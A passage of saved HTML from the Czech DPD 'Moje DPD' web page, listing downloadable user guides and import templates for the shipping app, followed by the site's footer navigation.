<p class="font-light" style="color: #414042;">Nevíte si rady? Kontaktujte nás prostřednictvím kontaktního formuláře. </p>
</div>
</div>
<div class="row text-bottom">
<div class="col-10 ml-5-001">
<p class="ellipsis" style="color: #414042">Kontaktní formulář</p>
</div>
<div class="col-2 icon-link">
<span>
<img class="float-right teaser-link-icon" src="./pop_files/Continue_Forward_black_pos_rgb.svg" alt="">
</span>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
<style>
        .preview .user-login-001 {
            display: block !important;
        }
        .preview .guest-teaser-001 {
            display: block !important;
            padding-bottom: 10px;
        }
    </style>
</div></div></div></div><div id="pg-22-4" class="panel-grid panel-no-style" data-style="{&quot;background_display&quot;:&quot;tile&quot;,&quot;cell_alignment&quot;:&quot;flex-start&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}" data-ratio="1" data-ratio-direction="right"><div id="pgc-22-4-0" class="panel-grid-cell" data-weight="1"><div id="panel-22-4-0-0" class="so-panel widget widget_dpd-intro-text-widget panel-first-child" data-index="8" data-style="{&quot;id&quot;:&quot;dokumenty_moje_dpd&quot;,&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:true,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div id="dokumenty_moje_dpd" class="panel-widget-style panel-widget-style-for-22-4-0-0"><div class="so-widget-dpd-intro-text-widget so-widget-dpd-intro-text-widget-default-d75171398898"><div class="content intro-text-seo row">
<div class="seo-text col-12 col-sm-12 col-md-12 offset-lg-2 col-lg-8 dpd-text-editor-content dpd-text-editor-content">
<h1 style="font-size: 30px;font-family: PlutoSansExtraLight;text-align: center"><span style="color: #dc0032"><span style="color: #414042">Dokumenty k</span> Moje DPD</span></h1>
</div>
</div></div></div></div><div id="panel-22-4-0-1" class="so-panel widget widget_dpd-tab-module-1a-widget panel-last-child" data-index="9" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-tab-module-1a-widget so-widget-dpd-tab-module-1a-widget-default-d75171398898"><div class="row no-gutters content-wrap-030-031">
<div class="wrap-tab-module col-12 text-center px-0">
<button type="button" class="previous-tab d-block" disabled="" style="visibility: hidden;"></button>
<div class="tab-module">
<ul class="nav nav-tabs justify-content-center" role="tablist">
<li id="i621f9f7696e751" class="nav-item text-left  w-031-tab" style="background-color: #ffffff" data-active-text-color="#dc0032" data-active-color="#dc0032" data-inactive-color="#414042">
<a class="font-light active show" id="content-tab-1-621f9f7696e75-tab" data-toggle="tab" href="#content-tab-1-621f9f7696e75">
<h3 class="font-normal mx-0  w-031-head-text" style="color: #dc0032;">Stáhněte si návody, abyste se v aplikaci lépe zorientovali </h3>
</a>
</li>
<li id="i621f9f7696e752" class="nav-item text-left  w-031-tab" style="background-color: #ffffff" data-active-text-color="#dc0032" data-active-color="#dc0032" data-inactive-color="#414042">
<a class="font-light inactive" id="content-tab-2-621f9f7696e75-tab" data-toggle="tab" href="#content-tab-2-621f9f7696e75">
<h3 class="font-normal mx-0  w-031-head-text" style="color: #414042;">Jak importovat data do aplikace Moje DPD? </h3>
</a>
</li>
</ul>
</div>
<button type="button" class="next-tab d-block" style="visibility: hidden;"></button>
</div>
<div class="tab-content col-12 pt-3">
<div class="tab-pane fade show active" id="content-tab-1-621f9f7696e75" role="tabpanel" aria-labelledby="content-tab-1-tab">
<div id="pl-w6b9d1bae" class="panel-layout"><div id="pg-w6b9d1bae-0" class="panel-grid panel-no-style"><div id="pgc-w6b9d1bae-0-0" class="panel-grid-cell panel-grid-cell-empty"></div><div id="pgc-w6b9d1bae-0-1" class="panel-grid-cell panel-grid-cell-mobile-last"><div id="panel-w6b9d1bae-0-1-0" class="so-panel widget widget_download-module-widget panel-first-child panel-last-child" data-index="0"><div class="so-widget-download-module-widget so-widget-download-module-widget-default-d75171398898"><div class="row">
<div class="col-12">
<div style="background: #ffffff; color: #414042">
<p class="pt-2"></p>
<div class="col-12">
<div class="row">
<div class="col-12 inactive-bg-color download-button vertical-align" style="background: #e6e7e8;">
<a href="javascript:void(0)" style="width: 100%; text-decoration: none !important;" class="download-module-010" download="Základní informace o aplikaci Moje DPD" data-url="https://www.dpd.com/wp-content/uploads/sites/226/2020/03/DPD_Aplikace-Moje-DPD.pdf" data-name="DPD_Aplikace-Moje-DPD.pdf" data-opts="application/pdf">
<div class="download-text pl-2" style="color: #414042">
<p class="mb-0 v-ellipsis v-ellipsis-lines-2">Základní informace o aplikaci Moje DPD</p>
<span class="small-text">Small (172kb)</span>
</div>
<div class="download-icon padding-top-icon-010 text-center main-bg-color" style="background-color: #dc0032;">
<p class="mb-0 light-color" style="color: #ffffff">PDF</p>
<img class="size-image-icon-010" src="./pop_files/Download_Save_to_trans_neg_rgb.svg">
</div>
</a>
</div>
<div class="col-12 inactive-bg-color download-button vertical-align" style="background: #e6e7e8;">
<a href="javascript:void(0)" style="width: 100%; text-decoration: none !important;" class="download-module-010" download="Jak vytvořit přepravní štítky a objednat vyzvednutí zásilky" data-url="https://www.dpd.com/wp-content/uploads/sites/226/2020/03/Moje-DPD-Jak-vytvořit-přepravní-štítky-a-objednat-vyzvednutí-zásilky-datum-revize-2018-08-27.pdf" data-name="Moje-DPD-Jak-vytvořit-přepravní-štítky-a-objednat-vyzvednutí-zásilky-datum-revize-2018-08-27.pdf" data-opts="application/pdf">
<div class="download-text pl-2" style="color: #414042">
<p class="mb-0 v-ellipsis v-ellipsis-lines-2">Jak vytvořit přepravní štítky a objednat vyzvednutí zásilky</p>
<span class="small-text">Medium (3430kb)</span>
</div>
<div class="download-icon padding-top-icon-010 text-center main-bg-color" style="background-color: #dc0032;">
<p class="mb-0 light-color" style="color: #ffffff">PDF</p>
<img class="size-image-icon-010" src="./pop_files/Download_Save_to_trans_neg_rgb.svg">
</div>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div></div></div><div id="pgc-w6b9d1bae-0-2" class="panel-grid-cell panel-grid-cell-empty"></div></div></div> </div>
<div class="tab-pane fade" id="content-tab-2-621f9f7696e75" role="tabpanel" aria-labelledby="content-tab-2-tab">
<div id="pl-w008c7584" class="panel-layout"><div id="pg-w008c7584-0" class="panel-grid panel-no-style"><div id="pgc-w008c7584-0-0" class="panel-grid-cell panel-grid-cell-empty"></div><div id="pgc-w008c7584-0-1" class="panel-grid-cell panel-grid-cell-mobile-last"><div id="panel-w008c7584-0-1-0" class="so-panel widget widget_download-module-widget panel-first-child panel-last-child" data-index="0"><div class="so-widget-download-module-widget so-widget-download-module-widget-default-d75171398898"><div class="row">
<div class="col-12">
<div style="background: #ffffff; color: #414042">
<p class="pt-2"></p>
<div class="col-12">
<div class="row">
<div class="col-12 inactive-bg-color download-button vertical-align" style="background: #e6e7e8;">
<a href="javascript:void(0)" style="width: 100%; text-decoration: none !important;" class="download-module-010" download="Jak importovat data do aplikace Moje DPD" data-url="https://www.dpd.com/wp-content/uploads/sites/226/2020/03/Jak-importovat-data-do-aplikace-Moje-DPD.pdf" data-name="Jak-importovat-data-do-aplikace-Moje-DPD.pdf" data-opts="application/pdf">
<div class="download-text pl-2" style="color: #414042">
<p class="mb-0 v-ellipsis v-ellipsis-lines-2">Jak importovat data do aplikace Moje DPD</p>
<span class="small-text">Medium (1155kb)</span>
</div>
<div class="download-icon padding-top-icon-010 text-center main-bg-color" style="background-color: #dc0032;">
<p class="mb-0 light-color" style="color: #ffffff">PDF</p>
<img class="size-image-icon-010" src="./pop_files/Download_Save_to_trans_neg_rgb.svg">
</div>
</a>
</div>
<div class="col-12 inactive-bg-color download-button vertical-align" style="background: #e6e7e8;">
<a href="javascript:void(0)" style="width: 100%; text-decoration: none !important;" class="download-module-010" download="Vzorová šablona pro import zásilek" data-url="https://www.dpd.com/wp-content/uploads/sites/226/2020/03/DPD-CZ-Vzorova-sablona-pro-import-zasilek.xls" data-name="DPD-CZ-Vzorova-sablona-pro-import-zasilek.xls" data-opts="application/vnd.ms-excel">
<div class="download-text pl-2" style="color: #414042">
<p class="mb-0 v-ellipsis v-ellipsis-lines-2">Vzorová šablona pro import zásilek</p>
<span class="small-text">Small (60kb)</span>
</div>
<div class="download-icon padding-top-icon-010 text-center main-bg-color" style="background-color: #dc0032;">
<p class="mb-0 light-color" style="color: #ffffff">XLS</p>
<img class="size-image-icon-010" src="./pop_files/Download_Save_to_trans_neg_rgb.svg">
</div>
</a>
</div>
<div class="col-12 inactive-bg-color download-button vertical-align" style="background: #e6e7e8;">
<a href="javascript:void(0)" style="width: 100%; text-decoration: none !important;" class="download-module-010" download="Vzorová šablona pro import zákazníků" data-url="https://www.dpd.com/wp-content/uploads/sites/226/2020/03/DPD-CZ-Vzorova-sablona-pro-import-zakazniku.xls" data-name="DPD-CZ-Vzorova-sablona-pro-import-zakazniku.xls" data-opts="application/vnd.ms-excel">
<div class="download-text pl-2" style="color: #414042">
<p class="mb-0 v-ellipsis v-ellipsis-lines-2">Vzorová šablona pro import zákazníků</p>
<span class="small-text">Small (30kb)</span>
</div>
<div class="download-icon padding-top-icon-010 text-center main-bg-color" style="background-color: #dc0032;">
<p class="mb-0 light-color" style="color: #ffffff">XLS</p>
<img class="size-image-icon-010" src="./pop_files/Download_Save_to_trans_neg_rgb.svg">
</div>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div></div></div><div id="pgc-w008c7584-0-2" class="panel-grid-cell panel-grid-cell-empty"></div></div></div> </div>
</div>
</div>
</div></div></div></div></div><p id="breadcrumbs"><span><span><a href="https://www.dpd.com/cz/">Hlavní stránka</a> / <span class="breadcrumb_last" aria-current="page">Moje DPD</span></span></span></p></div>
<footer class="page-footer container">
<div class="row-fix-margin-auto desktop-footer d-none d-md-block gold-bg-color">
<div class="col-12">
<div class="row footer-sitemap">
<div class="col-md-9 col-lg-10">
<div class="row">
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/cz/cs/poslat-balik/" class="grey-color">Poslat balík</a>
</p>
<p class="small-text mb-2 font-light">
<a href="?page_id=20#registrovany_zakaznik" class="grey-color">Registrovaný zákazník</a>
</p>
<p class="small-text mb-2 font-light">
<a href="?page_id=20#neregistrovany_zakaznik" class="grey-color">Neregistrovaný zákazník</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/poslat-balik/mezinarodni-preprava/" class="grey-color">Mezinárodní přeprava</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/poslat-balik/pro-eshopy/" class="grey-color">Pro e-shopy</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/poslat-balik/vraceni-zasilky/" class="grey-color">Vrácení zásilky</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/cz/cs/cekam-balik/" class="grey-color">Čekám balík</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/tracking/(lang)/cs_CZ" class="grey-color">Sledování balíku</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/" class="grey-color">Výdejní místa Pickup</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/cekam-balik/dpd-kuryr/" class="grey-color">DPD Kurýr</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/cekam-balik/boxy/" class="grey-color">DPD boxy</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/cz/cs/o-nas/" class="grey-color">O nás</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/pro-media/" class="grey-color">Pro média</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/inovace/" class="grey-color">Inovace</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/nase-sluzby/" class="grey-color">Naše služby</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/" class="grey-color">Společenská odpovědnost</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/kariera/" class="grey-color">Kariéra</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/kontakt/" class="grey-color">Kontakt</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/cz/cs/dpdshipping/" class="grey-color">DPD Shipping</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/dpdshipping/" class="grey-color">Více o aplikaci DPD Shipping</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://shipping.dpdgroup.com/login" class="grey-color">Přihlásit se do aplikace DPD Shipping</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/cz/cs/moje-dpd/" class="grey-color">Moje DPD</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.mojedpd.cz/IT4EMWeb/Login.html?locale=cs" class="grey-color">Přihlásit se do Moje DPD</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/moje-dpd/videa/" class="grey-color">Instruktážní videa k Moje DPD</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/cz/cs/podpora/" class="grey-color">Podpora</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/nejcastejsi-dotazy/" class="grey-color">Nejčastější dotazy</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/aktualni-informace/" class="grey-color">Aktuální informace</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/podminky-prepravy/" class="grey-color">Podmínky přepravy</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/aplikace-a-nastroje/" class="grey-color">Aplikace a nástroje</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/reklamace/" class="grey-color">Reklamace</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/dokumenty-ke-stazeni/" class="grey-color">Dokumenty ke stažení</a>
</p>
</div>
</div>
</div>
</div>
<div class="col-md-3 col-lg-2">
<div id="dpd_social_accounts_wg-3" class="widget dpd_social_accounts_wg"><div class="widget__inner dpd_social_accounts_wg__inner widget-wrap"> <div class="mb-3">
<p class="small-text mb-2">Sledujte nás!</p>
<p class="small-text mb-2 font-light">
<a href="https://www.linkedin.com/company/dpd-cz/?originalSubdomain=cz" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/LinkedIn_blackred_pos_rgb.png" width="22" height="22"></a><a href="https://www.facebook.com/dpd.cz" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/Facebook_blackred_pos_rgb.png" width="22" height="22"></a><a href="https://twitter.com/dpd_cz" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/Twitter_blackred_pos_rgb.png" width="22" height="22"></a><a href="https://www.instagram.com/dpd.cz/" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/Instagram_blackred_pos_rgb.png" width="22" height="22"></a>
</p>
</div>
</div></div><div id="custom_html-2" class="widget_text widget widget_custom_html"><div class="widget_text widget__inner widget_custom_html__inner widget-wrap"><div class="textwidget custom-html-widget"><a href="#" onclick="tC.privacyCenter.showPrivacyCenter();return false">Cookies</a></div></div></div>
</div>
</div>
<div class="row no-gutters vertical-align footer-social">
<div class="footer-clear col-12 bold-bg-color mb-3"></div>
<div class="col-lg-4 col-md-3 px-md-0 small-text font-light footer-logo">
<img src="./pop_files/footer-logo.PNG" alt=""><span>&nbsp;2020 DPD</span>
</div>
<div class="col-lg-8 col-md-9 px-0 footer-menu">
<nav class="nav d-inline-block footer-text font-light footer-nav float-right">
<ul class="footer-link px-0">
<li>
<a href="https://www.dpd.com/cz/cs/bezpecnostni-informace/" class="grey-color">Bezpečnostní informace</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/vseobecne-obchodni-podminky/" class="grey-color">Všeobecné obchodní podmínky</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/ochrana-osobnich-udaju/" class="grey-color">Ochrana osobních údajů</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/kontakt/" class="grey-color">Kontakt</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/sitemap/" class="grey-color">Sitemap</a>
</li>
<li>
<a href="https://www.dpd.com/group/en" class="grey-color">DPDgroup</a>
</li>
<li class="language-items text-nowrap">
<select id="footer-language-select" class="footer-language-select pt-1 small-text" name="footer-language-select" onchange="location = this.value;">
<option value="https://www.dpd.com/cz/cs/moje-dpd/" selected="">Czech</option>
<option value="https://www.dpd.com/cz/en/moje-dpd/">English</option>
</select>
<a class="select-arrow" href="javascript:void(0)"><svg class="svg-inline--fa fa-chevron-down fa-w-14 grey-color" aria-hidden="true" data-prefix="fas" data-icon="chevron-down" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path></svg></a>
</li>
</ul>
</nav>
</div>
</div>
</div>
</div>
<div class="row-fix-margin-auto mobile-footer d-block d-md-none gold-bg-color">
<div class="col-12 no-padding">
<div class="row">
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/cz/cs/poslat-balik/" class="grey-color">
Poslat balík </a>
</p>
<i class="footer-sub-expand"></i>
<div class="footer-link-content">
<p class="small-text mb-2 font-light">
<a href="?page_id=20#registrovany_zakaznik" class="grey-color">Registrovaný zákazník</a>
</p>
<p class="small-text mb-2 font-light">
<a href="?page_id=20#neregistrovany_zakaznik" class="grey-color">Neregistrovaný zákazník</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/poslat-balik/mezinarodni-preprava/" class="grey-color">Mezinárodní přeprava</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/poslat-balik/pro-eshopy/" class="grey-color">Pro e-shopy</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/poslat-balik/vraceni-zasilky/" class="grey-color">Vrácení zásilky</a>
</p>
</div>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/cz/cs/cekam-balik/" class="grey-color">
Čekám balík </a>
</p>
<i class="footer-sub-expand"></i>
<div class="footer-link-content">
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/tracking/(lang)/cs_CZ" class="grey-color">Sledování balíku</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/" class="grey-color">Výdejní místa Pickup</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/cekam-balik/dpd-kuryr/" class="grey-color">DPD Kurýr</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/cekam-balik/boxy/" class="grey-color">DPD boxy</a>
</p>
</div>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/cz/cs/o-nas/" class="grey-color">
O nás </a>
</p>
<i class="footer-sub-expand"></i>
<div class="footer-link-content">
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/pro-media/" class="grey-color">Pro média</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/inovace/" class="grey-color">Inovace</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/nase-sluzby/" class="grey-color">Naše služby</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/" class="grey-color">Společenská odpovědnost</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/o-nas/kariera/" class="grey-color">Kariéra</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/kontakt/" class="grey-color">Kontakt</a>
</p>
</div>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/cz/cs/dpdshipping/" class="grey-color">
DPD Shipping </a>
</p>
<i class="footer-sub-expand"></i>
<div class="footer-link-content">
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/dpdshipping/" class="grey-color">Více o aplikaci DPD Shipping</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://shipping.dpdgroup.com/login" class="grey-color">Přihlásit se do aplikace DPD Shipping</a>
</p>
</div>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/cz/cs/moje-dpd/" class="grey-color">
Moje DPD </a>
</p>
<i class="footer-sub-expand"></i>
<div class="footer-link-content">
<p class="small-text mb-2 font-light">
<a href="https://www.mojedpd.cz/IT4EMWeb/Login.html?locale=cs" class="grey-color">Přihlásit se do Moje DPD</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/moje-dpd/videa/" class="grey-color">Instruktážní videa k Moje DPD</a>
</p>
</div>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/cz/cs/podpora/" class="grey-color">
Podpora </a>
</p>
<i class="footer-sub-expand"></i>
<div class="footer-link-content">
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/nejcastejsi-dotazy/" class="grey-color">Nejčastější dotazy</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/aktualni-informace/" class="grey-color">Aktuální informace</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/podminky-prepravy/" class="grey-color">Podmínky přepravy</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/aplikace-a-nastroje/" class="grey-color">Aplikace a nástroje</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/reklamace/" class="grey-color">Reklamace</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/cz/cs/podpora/dokumenty-ke-stazeni/" class="grey-color">Dokumenty ke stažení</a>
</p>
</div>
</div>
</div>
</div>
<div class="col-12 no-padding">
<div id="dpd_social_accounts_wg-3" class="widget dpd_social_accounts_wg"><div class="widget__inner dpd_social_accounts_wg__inner widget-wrap"> <div class="mb-3">
<p class="small-text mb-2">Sledujte nás!</p>
<p class="small-text mb-2 font-light">
<a href="https://www.linkedin.com/company/dpd-cz/?originalSubdomain=cz" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/LinkedIn_blackred_pos_rgb.png" width="22" height="22"></a><a href="https://www.facebook.com/dpd.cz" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/Facebook_blackred_pos_rgb.png" width="22" height="22"></a><a href="https://twitter.com/dpd_cz" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/Twitter_blackred_pos_rgb.png" width="22" height="22"></a><a href="https://www.instagram.com/dpd.cz/" class="social-link primary-color mr-3" target="_blank"><img class="mb-1" src="./pop_files/Instagram_blackred_pos_rgb.png" width="22" height="22"></a>
</p>
</div>
</div></div><div id="custom_html-2" class="widget_text widget widget_custom_html"><div class="widget_text widget__inner widget_custom_html__inner widget-wrap"><div class="textwidget custom-html-widget"><a href="#" onclick="tC.privacyCenter.showPrivacyCenter();return false">Cookies</a></div></div></div>
<div class="footer-clear col-12 bold-bg-color mb-3"></div>
</div>
<div class="col-12 no-padding">
<div class="row vertical-align">
<div class="col-lg-4 col-md-3 px-md-0 small-text font-light footer-logo">
<img src="./pop_files/footer-logo.PNG" alt=""><span>&nbsp;2020 DPD</span>
</div>
<div class="col-12 footer-menu">
<nav class="nav d-block pt-1 small-text font-light footer-nav">
<ul class="footer-link">
<li>
<a href="https://www.dpd.com/cz/cs/bezpecnostni-informace/" class="grey-color">Bezpečnostní informace</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/vseobecne-obchodni-podminky/" class="grey-color">Všeobecné obchodní podmínky</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/ochrana-osobnich-udaju/" class="grey-color">Ochrana osobních údajů</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/kontakt/" class="grey-color">Kontakt</a>
</li>
<li>
<a href="https://www.dpd.com/cz/cs/sitemap/" class="grey-color">Sitemap</a>
</li>
<li>
<a href="https://www.dpd.com/group/en" class="grey-color">DPDgroup</a>
</li>
<li class="language-items text-nowrap">
<select id="footer-language-select" class="footer-language-select pt-1 small-text" name="footer-language-select" onchange="location = this.value;">
<option value="https://www.dpd.com/cz/cs/moje-dpd/" selected="">Czech</option>
<option value="https://www.dpd.com/cz/en/moje-dpd/">English</option>
</select>
<a class="select-arrow" href="javascript:void(0)"><svg class="svg-inline--fa fa-chevron-down fa-w-14 grey-color" aria-hidden="true" data-prefix="fas" data-icon="chevron-down" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"></path></svg></a>
</li>
</ul>
</nav>
</div>
</div>
</div>
</div>
</footer>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PSX7MP7"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<app-root class="app-root" _ngihost-awq-c29="" ng-version="12.0.5" _ngihost-mjt-c29=""><app-web-chat-overlay _ngcontent-mjt-c29="" _ngihost-mjt-c28="" class="ng-tns-c28-0"><!----></app-web-chat-overlay></app-root>

<style>.desktop-footer{ padding-bottom: 65px !important} .mobile-footer{ padding-bottom: 90px !important}</style>
<style type="text/css"></style> <style type="text/css"></style> <style type="text/css"></style> <style type="text/css" media="all" id="siteorigin-panels-layouts-footer">/* Layout wbe9203f7 */ #pgc-wbe9203f7-0-0 { width:100%;width:calc(100% - ( 0 * 30px ) ) } #pl-wbe9203f7 .so-panel { margin-bottom:30px } #pl-wbe9203f7 .so-panel:last-child { margin-bottom:0px } @media (max-width:780px){ #pg-wbe9203f7-0.panel-no-style, #pg-wbe9203f7-0.panel-has-style > .panel-row-style { -webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column } #pg-wbe9203f7-0 > .panel-grid-cell , #pg-wbe9203f7-0 > .panel-row-style > .panel-grid-cell { width:100%;margin-right:0 } #pg-wbe9203f7-0 { margin-bottom:px } #pl-wbe9203f7 .panel-grid-cell { padding:0 } #pl-wbe9203f7 .panel-grid .panel-grid-cell-empty { display:none } #pl-wbe9203f7 .panel-grid .panel-grid-cell-mobile-last { margin-bottom:0px }  } /* Layout w6b9d1bae */ #pgc-w6b9d1bae-0-0 , #pgc-w6b9d1bae-0-2 { width:25%;width:calc(25% - ( 0.75 * 30px ) ) } #pgc-w6b9d1bae-0-1 { width:50%;width:calc(50% - ( 0.5 * 30px ) ) } #pl-w6b9d1bae .so-panel { margin-bottom:30px } #pl-w6b9d1bae .so-panel:last-child { margin-bottom:0px } #pg-w6b9d1bae-0.panel-no-style, #pg-w6b9d1bae-0.panel-has-style > .panel-row-style { -webkit-align-items:flex-start;align-items:flex-start } #pgc-w6b9d1bae-0-1 { align-self:auto } @media (max-width:780px){ #pg-w6b9d1bae-0.panel-no-style, #pg-w6b9d1bae-0.panel-has-style > .panel-row-style { 